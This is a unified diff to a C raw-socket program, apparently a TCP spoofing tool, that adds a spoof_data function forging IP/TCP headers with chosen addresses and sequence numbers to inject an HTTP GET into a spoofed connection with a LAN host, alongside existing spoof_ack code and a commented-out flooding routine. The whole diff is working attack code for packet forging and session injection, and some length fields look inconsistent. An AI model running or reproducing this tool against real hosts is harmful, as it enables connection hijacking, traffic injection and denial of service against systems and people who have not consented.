@@ -88,6 +88,7 @@ void send_tcp_segment(struct iphdr *ih, struct tcphdr *th, char *data, int dlen)
 
     struct sockaddr_in sin;	/* how necessary is this, given that the destination
 				   address is already in the ip header? */
+	printf("sending... %s\n", data);
 
     ph.saddr=ih->saddr;
     ph.daddr=ih->daddr;
@@ -169,6 +170,7 @@ unsigned long spoof_ack(unsigned long my_ip, unsigned long their_ip, unsigned sh
     struct tcphdr th;
     char buf[1024];
     struct timeval tv;
+	char *data = "";
 
     ih.version=4;
     ih.ihl=5;
@@ -199,7 +201,54 @@ unsigned long spoof_ack(unsigned long my_ip, unsigned long their_ip, unsigned sh
     th.check=0;
     th.urg_ptr=0;
 
-    send_tcp_segment(&ih, &th, "", 0);
+    send_tcp_segment(&ih, &th, data, strlen(data));
+
+    send_seq = SEQ+1+strlen(buf);
+}
+
+unsigned long spoof_data(unsigned long my_ip, unsigned long their_ip, unsigned short port)
+{
+    struct iphdr ih;
+    struct tcphdr th;
+    char buf[1024];
+    struct timeval tv;
+//    char *data = "GET / HTTP/1.1\r\nHost: 192.168.168.69\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nIf-Modified-Since: Fri, 31 Aug 2018 09:06:39 GMT\r\nCache-Control: max-age=0\r\n";
+//	char *opt_data = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00GET / HTTP/1.1\r\nHost: 192.168.168.69\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nIf-Modified-Since: Fri, 31 Aug 2018 09:06:39 GMT\r\nCache-Control: max-age=0\r\n";
+	char *data = "GET / HTTP/1.1\r\n";
+	char *opt_data = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00GET / HTTP/1.1\r\n";
+    ih.version=4;
+    ih.ihl=5;
+    ih.tos=0;           /* XXX is this normal? */
+    ih.tot_len=sizeof(ih)+sizeof(th)+12;
+    ih.id=htons(random());
+    ih.frag_off=0;
+    ih.ttl=30;
+    ih.protocol=IPPROTO_TCP;
+    ih.check=0;
+    ih.saddr=my_ip;
+    ih.daddr=their_ip;
+
+    th.source=htons(srcport);
+    th.dest=htons(port);
+    th.seq=htonl(SEQ + 1);
+    th.doff=(sizeof(th))/4;
+    th.ack_seq=(*ack_num);
+    th.res1=0;
+    th.fin=0;
+    th.syn=0;
+    th.rst=0;
+    th.psh=1;
+    th.ack=1;
+    th.urg=0;
+	th.ece = 0;
+	th.cwr = 0;
+//    th.res2=0;
+    th.window=htons(65535);
+    th.check=0;
+    th.urg_ptr=0;
+
+//    send_tcp_segment(&ih, &th, opt_data, strlen(data)+12);
+	send_tcp_segment(&ih, &th, data, strlen(data));
 
     send_seq = SEQ+1+strlen(buf);
 }
@@ -302,6 +351,36 @@ int main(int argc, char **argv)
 	}
 	printf("%s\n", buf);
 	spoof_ack(src_ip, des_ip, des_port);
+/*
+    if((msg_len = recv(rsock, buf, 0x3b - 0x0e, 0)) == -1)
+    {
+        perror("recv: ");
+        exit(-1);
+    }
+    for (i = 0; i < 4; i ++)
+    {
+        tmp[i] = buf[0x1c - 0x4 + i];
+    }
+    tmp[3] ++;
+    ack_num = (int *)tmp;
+    printf("len = %ld\n", msg_len);
+    for (i = 0; i < 128; i++)
+    {
+        if (i % 8 == 0)
+        {
+            printf(" ");
+        }
+        if (i % 0x10 == 0)
+        {
+            printf(" \n");
+        }
+        printf("%02x ", buf[i] & 0xff);
+    }
+    printf("%s\n", buf);
+*/
+
+	 spoof_data(src_ip, des_ip, des_port);
+
 /*
 	printf("flooding. each dot equals 25 packets.\n");
 
